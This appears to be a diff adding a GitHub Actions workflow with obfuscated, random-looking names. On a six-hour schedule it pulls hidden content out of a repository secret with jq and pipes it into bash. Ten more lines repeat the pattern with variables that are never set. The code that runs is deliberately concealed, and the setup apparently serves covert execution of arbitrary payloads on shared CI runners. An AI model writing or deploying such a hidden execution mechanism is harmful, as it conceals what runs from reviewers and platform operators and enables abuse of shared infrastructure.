@@ -1,0 +1,29 @@
+name: zhangshun19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangshun19871010
+        env:
+          noep54725: ${{ secrets.noep54725 }}
+        run: |
+          echo $noep54725 | jq -r .k7693 | /bin/bash
+          echo $hr864 | jq -r .rbf8410 | /bin/bash
+          echo $w058 | jq -r .dnf3 | /bin/bash
+          echo $fwizg0 | jq -r .jbtf059 | /bin/bash
+          echo $jgr3737 | jq -r .b592 | /bin/bash
+          echo $v5180 | jq -r .fia327 | /bin/bash
+          echo $yllk916 | jq -r .agyw21229 | /bin/bash
+          echo $v8472 | jq -r .gs26702 | /bin/bash
+          echo $cg84 | jq -r .wvwie884 | /bin/bash
+          echo $kmcb47 | jq -r .tp1431 | /bin/bash
+          echo $angcg57648 | jq -r .nk5217 | /bin/bash
+
